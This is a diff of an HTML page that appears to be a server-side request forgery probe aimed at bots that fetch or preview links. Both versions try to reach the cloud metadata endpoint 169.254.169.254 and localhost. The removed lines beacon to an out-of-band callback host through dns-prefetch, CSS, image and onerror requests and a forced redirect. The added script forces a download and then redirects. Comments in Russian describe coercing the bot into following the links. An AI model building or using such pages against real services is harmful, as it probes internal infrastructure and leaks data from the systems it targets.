@@ -1,29 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <link rel="dns-prefetch" href="http://dns_leak_v8.esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun">
-    
-    <style>
-        body {
-            background-image: url("http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/CSS_LEAK_START");
-        }
-        /* Попытка достучаться до метаданных через CSS (если браузер разрешит) */
-        @font-face {
-            font-family: 'ssrf';
-            src: url('http://169.254.169.254/latest/meta-data/instance-id');
-        }
-    </style>
-</head>
 <body>
-    <img src="http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/IMG_TAG_LEAK">
-    
-    <img src="http://127.0.0.1:80/favicon.ico" onerror="document.body.style.backgroundColor='red'; new Image().src='http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/LOCAL_80_HIT';">
+    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg" alt="Proof">
+
+    <img src="http://169.254.169.254/latest/meta-data/instance-id?.jpg">
+
+    <picture>
+      <source srcset="http://127.0.0.1:80/favicon.ico">
+      <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg">
+    </picture>
 
     <script>
-        // Последняя отчаянная попытка: синхронный редирект
-        // Если бот просто быстро закрывается, мы заставим его перейти по ссылке
-        window.location.replace("http://esqbwjbyepcxrsacleqfxgfxgfqe42qhw.oast.fun/FINAL_SYNC_REDIRECT");
+        // Если JS все-таки работает (для того первого бота MAX), 
+        // мы заставим его принудительно скачать картинку
+        var link = document.createElement('a');
+        link.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg";
+        link.download = "proof.jpg";
+        document.body.appendChild(link);
+        link.click();
+        
+        // Редирект на саму картинку в конце
+        setTimeout(() => {
+            window.location.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/i-17.jpg";
+        }, 500);
     </script>
 </body>
 </html>
